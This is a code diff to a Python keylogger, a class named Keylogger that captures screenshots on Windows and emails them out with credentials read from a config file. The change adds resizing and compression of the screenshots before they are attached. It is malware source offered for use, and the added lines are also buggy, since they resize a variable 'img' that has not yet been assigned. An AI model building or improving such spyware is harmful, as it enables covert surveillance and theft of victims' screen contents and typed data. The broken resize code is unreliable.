@@ -8,7 +8,7 @@ from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from email.mime.multipart import MIMEMultipart
 from threading import Semaphore, Timer, Event
-from PIL import ImageGrab
+from PIL import ImageGrab, Image
 import win32gui
 from config import fromAddr, fromPswd
 
@@ -102,6 +102,10 @@ class Keylogger:
         for file in os.listdir('screenshots'):
             filename = os.fsdecode(file)
             if filename.endswith('png'):
+                img_c = Image.open(f'screenshots/{filename}')
+                img_c = img.resize((1920,1080), Image.LANCZOS)
+                img_c.save(f'screenshots/{filename}', optimize=True, quality=85)
+                
                 img_data = open(f'screenshots/{filename}', 'rb').read()
                 img = MIMEImage(img_data, name=filename)
                 msg.attach(img)
